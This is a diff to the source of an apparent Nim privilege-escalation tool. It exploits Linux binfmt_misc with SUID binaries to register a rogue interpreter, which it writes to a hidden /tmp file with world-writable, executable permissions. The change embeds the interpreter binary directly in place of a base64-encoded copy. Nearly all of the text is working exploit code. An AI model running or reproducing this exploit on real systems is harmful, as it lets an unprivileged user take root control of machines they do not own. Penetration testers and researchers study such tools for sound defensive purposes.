@@ -3,7 +3,6 @@ import osproc
 import os
 import std/posix_utils
 import std/strutils
-import std/base64
 import streams
 import terminal
 
@@ -19,7 +18,7 @@ const SUID_PERM = 0o4000
 const EXEC_PERM = 0o100
 
 const INTERPRETER_PATH: string = "/tmp/.6wwMkxWeWd"
-const INTERPRETER_CONTENT : string = slurp"../bin/interpreter.b64" #staticRead 
+const INTERPRETER_CONTENT : string = slurp"../bin/interpreter" #staticRead 
 
 proc checkBinfmt(privesc:bool):bool=
   ## Different checks to verify that the binfmt config allow the exploit
@@ -103,7 +102,7 @@ proc searchSuid(dir, file: string,chooseSuid: bool): string=
   elif suids.len > 0 : return suids[^1]
   return ""
 
-proc exploit(registerPath, suidPath, interpreterB64: string): void=
+proc exploit(registerPath, suidPath, interpreter: string): void=
   ## Exploit BIN_FMT feature to register a new type of executable
   ## - check that suid is an ELF binary
   ## - create interpreter
@@ -121,7 +120,6 @@ proc exploit(registerPath, suidPath, interpreterB64: string): void=
 
   # retrieve interpreter (from now it is done at compilation time)
   # write interpreter in fs
-  var interpreter = decode(interpreterB64)
   writeFile(INTERPRETER_PATH, interpreter)
   setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec,fpOthersExec,fpOthersRead,fpOthersWrite})
   styledEcho("✍️ Write interpreter in: ",fgCyan,INTERPRETER_PATH)
